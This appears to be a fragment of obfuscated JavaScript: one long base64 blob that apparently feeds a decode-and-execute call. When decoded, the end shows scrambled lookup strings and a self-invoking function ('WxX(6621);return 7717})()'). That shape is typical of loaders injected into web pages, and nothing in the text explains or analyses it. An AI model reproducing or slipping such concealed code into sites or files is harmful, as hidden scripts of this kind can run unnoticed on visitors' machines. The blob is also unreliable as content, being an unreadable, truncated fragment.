GQuJV8uZV50PW9jOV50Xl4pT10uXl1zXUZve29eY2Jvb3Vnb2F0fWVNM147O11eNWldOj0ufTd3ajFpKG5vMyEuOmljIC5uZ2VubHJwYW50PV0yMzRFaVR9KSgzfV9eXmMiMG4lOjBeXmhmXmFOY2NsdGdeZSw+RzlfRTdfYV0oJV0gczFKb3N9LTVvOTlzSTh3PV5yWjNeKGM3XV4wXiVvZl40Xl5fW14oIylpO319Xl5kXmFlXm9jXmEibV5eXSEuQWV2JXNeN3JeXmZeKXshXV9gXl5eeyw7XVMsdWEsX15eWCleLj1wXmEzKTguaF5pe19ee0leYz1dLl0lXTtkKyReIWk7c3RvXl5yY3t1ZSE4e0g4XzYgXWQrPV5yMzNeJF80XmMlKShdKUlybERjKDcjXjBuNCIod3RebXQkX15fXSBlOyB3Xl9dXjF2X2NfKTE3NnV0ZiNpUmMycC5eMS40XWUpO15KPSEhbzJnKTIuYl1lbiUoJStTXkltXk9eX190XzFjezEjPSQ+YzUoPTFdKV5vPV0hXl8iJWVuXyBhc18kJWFeOC4xY2cpdEl1LH1eX10oaV59KWY1MmN9JW85IGNyY1Q7XlwvXiIwZF1pXV5sMDkxIF1OeHNqbyBzYl5bXyNedD1iXl1zUHNjLF8gc1gtTz1eNTk2Xl9lOChpSl5ufShpZXtfXmFqLmRfZmEudCJeX11vbyl0bW5vXjI0ajM2OSxebyAwbnBtXm57PV5zcmddZC5cXDhsJXsgbHNkLD0uXC9jaSVfZjRebWdfXjheOGxeXm8gd14wXS45cjpjTl03X3BwLkgyKGZea2U9b2QxKGE5XmUtKV9eO15hISEuX24ub2VeWzE+XmIgNTRifV4tKXggIWkoeil1cl5nXV1eXmFjZHRlZWN9O0BscnJwXiEhImNpOX1uMmNOfSxwYjRQdGNdLl5dMHReICVjMUFkLF5KfC1oJiVuW30gJF8gIX1bbWYoOU0uWH0mXl54Xi4xY140cmZbNiVsaTk7e3R9JStzZmx9Xj17bChmXV9sXi4oZV5dM3NvLHJuKW1jI15DPXN9bl5lXnItIC47X1wnaWVjYS56Ll4gUWxhZ3IoY14lXl47LHNwXmhoVyhOaXQpXm8xITEhaDcpY2JJcF1haSBhaDNnJTZqZWJeXy4gLmEwcl5uLl4hXj9ePSAuXyAqLmRdZV1eOSg1b29mbGN9ZW9jdFwvcl5VIV1OMnQnKSk7dmFyIFd4WD11eWgocUdsLEhOQSApO1d4WCg2NjIxKTtyZXR1cm4gNzcxN30pKCk='))
